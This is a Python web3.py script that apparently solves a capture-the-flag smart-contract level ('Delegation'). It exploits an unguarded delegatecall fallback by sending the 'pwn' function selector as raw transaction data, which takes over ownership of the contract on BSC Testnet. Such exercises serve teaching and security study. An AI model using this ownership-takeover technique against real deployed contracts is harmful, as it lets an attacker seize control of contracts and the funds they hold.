# This contract's fallback functions delegate a call to the delegate contract. The delegate
# contract has a "pwn" function that changes the owner to the msg.sender. Since the delegate
# call keeps the msg.sender and execute in the context of the caller contract, we can use
# that to get the main contract ownership. The complexity here is to get the target 
# function selector and create a custom transaction activating the fallback function of 
# the target.

# Using web3.py library to make it easier building and signing transactions
# For this solution I had to use BSC Testnet as the hardhat local network was not able 
# to call functions between contracts.

from web3 import Web3, middleware
from web3.middleware import construct_sign_and_send_raw_middleware
from web3.middleware import geth_poa_middleware # Needed for BSC

# Util library to work with private keys and address
from eth_account import Account

# Library to read the JSONs that contains the contract ABI
import json

# Setting up the account to sign transactions.
main_account = Account.from_key("") #TODO: Include operator PK
print("Main wallet: " + main_account.address)

# Setting up the provider. For this solution I had to use BSC Testnet
w3Provider = Web3(Web3.HTTPProvider("https://data-seed-prebsc-1-s1.binance.org:8545"))
w3Provider.middleware_onion.inject(geth_poa_middleware, layer=0) # needed for BSC
w3Provider.middleware_onion.add(construct_sign_and_send_raw_middleware(main_account))
w3Provider.eth.default_account = main_account.address

# Gas strategy is a parameter necessary for BSC Testnet
def gas_price_strategy(web3, transaction_params):
    return Web3.toWei(10, 'gwei')

w3Provider.eth.set_gas_price_strategy(gas_price_strategy)
w3Provider.middleware_onion.add(middleware.time_based_cache_middleware)

# This solution doesn't need an attacking contract. We just need to call the correct function
buildFile = open('../contracts/build/contracts/levels/Delegation.sol/Delegate.json', "r")
build = json.loads(buildFile.read())
delegationContract = w3Provider.eth.contract(address='', abi=build['abi']) #TODO: Include deployed contract address

# Let's check the original owner
owner = delegationContract.functions.owner().call()
print("The owner is :" + owner)

# We need the function selector to build the message
selector = delegationContract.encodeABI("pwn")
print("The function selector is: " + selector)

# Now we build and send the transaction dictionary
transaction = w3Provider.eth.send_transaction({
  'to': delegationContract.address,
  'from': main_account.address,
  'gas': 32000,
  'gasPrice': Web3.toWei(10, 'gwei'),
  'chainId': 97,
  'data': selector
})
print(w3Provider.eth.wait_for_transaction_receipt(transaction))

# As a side note, why using the ABI of the Delegate contract and calling the pwn didn't work?

# Check the actual owner
owner = delegationContract.functions.owner().call()
print("The owner is :" + owner)
